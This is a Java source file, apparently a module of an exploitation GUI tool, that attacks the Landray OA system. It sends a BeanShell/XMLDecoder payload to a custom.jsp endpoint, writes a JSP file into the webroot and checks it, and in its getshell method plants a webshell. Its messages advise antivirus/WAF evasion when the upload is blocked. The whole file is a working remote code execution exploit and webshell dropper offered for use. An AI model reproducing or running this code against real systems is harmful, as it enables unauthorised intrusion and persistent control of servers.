package exp.oa.landrayoa;

import core.Exploitlnterface;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import sun.misc.BASE64Encoder;
import utils.HttpTools;
import utils.Response;
import utils.shell;

import java.util.HashMap;

public class landray_fileupload_sysSearch implements Exploitlnterface {

    @Override
    public Boolean checkVul(String url, TextArea textArea) {
        Boolean att = att(url, textArea);
        return att;
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        return shell(url,textArea);
    }

    private Boolean att(String url,TextArea textArea){
        HashMap<String,String> head = new HashMap<>();
        head.put("Content-Type","application/x-www-form-urlencoded");

        String ok_result = (new BASE64Encoder()).encodeBuffer(shell.readFile(shell.Testpath).getBytes()).trim();
        String t1 = shell.gbEncoding("import java.lang.*;import java.io.*;Class cls=Thread.currentThread().getContextClassLoader().loadClass(\"bsh.Interpreter\");String path=cls.getProtectionDomain().getCodeSource().getLocation().getPath();File f=new File(path.split(\"WEB-INF\")[0]+\"/loginzhu.jsp\");f.createNewFile();FileOutputStream fout=new FileOutputStream(f);fout.write(new sun.misc.BASE64Decoder().decodeBuffer(\"" + ok_result + "\"));fout.close()");
        String payload = "var={\"body\":{\"file\":\"/sys/search/sys_search_main/sysSearchMain.do?method=editParam\"}}&fdParemNames=12&fdParameters=<java><void class=\"bsh.Interpreter\"><void%20method=%22eval%22><string>"+ t1 +"</string></void></void></java>";

        Response post = HttpTools.post(url + "/sys/ui/extend/varkind/custom.jsp", payload, head, "utf-8");
        Response response = HttpTools.get(url + "/loginzhu.jsp", new HashMap<String, String>(), "utf-8");
        if(response.getCode() == 200 && response.getText().contains(shell.test_payload)){
            Platform.runLater(() -> {
                textArea.appendText("\n 漏洞存在 测试文件写入成功 \n " + url + "/loginzhu.jsp");
            });
            return true;
        }else {
            Platform.runLater(() -> {
                textArea.appendText("\n landrayoa_fileupload_sysSearch-RCE-漏洞不存在 (出现误报请联系作者)");
            });
            return false;
        }
    }


    private Boolean shell(String url,TextArea textArea){
        HashMap<String,String> head = new HashMap<>();
        head.put("Content-Type","application/x-www-form-urlencoded");

        String rdf = shell.readFile(shell.Jsppath).trim();
        String ok_result = (new BASE64Encoder()).encodeBuffer(rdf.getBytes());
        String t1 = shell.gbEncoding("import java.lang.*;import java.io.*;Class cls=Thread.currentThread().getContextClassLoader().loadClass(\"bsh.Interpreter\");String path=cls.getProtectionDomain().getCodeSource().getLocation().getPath();File f=new File(path.split(\"WEB-INF\")[0]+\"/loginzhuda.jsp\");f.createNewFile();FileOutputStream fout=new FileOutputStream(f);fout.write(new sun.misc.BASE64Decoder().decodeBuffer(\"" + ok_result + "\"));fout.close()");
        String payload = "var={\"body\":{\"file\":\"/sys/search/sys_search_main/sysSearchMain.do?method=editParam\"}}&fdParemNames=12&fdParameters=<java><void class=\"bsh.Interpreter\"><void%20method=%22eval%22><string>"+ t1 +"</string></void></void></java>";

        Response post = HttpTools.post(url + "/sys/ui/extend/varkind/custom.jsp", payload, head, "utf-8");
        Response response = HttpTools.get(url + "/loginzhuda.jsp", new HashMap<String, String>(), "utf-8");
        if(response.getCode() == 200 && response.getText().contains(shell.test_payload)){
            Platform.runLater(() -> {
                textArea.appendText("\n 漏洞存在 shell文件写入成功 \n " + url + "/loginzhuda.jsp");
            });
            return true;
        }else {
            Platform.runLater(() -> {
                textArea.appendText("\n getshell失败！！！waf查杀！！！请进行免杀！！！！！");
            });
            return false;
        }
    }


}
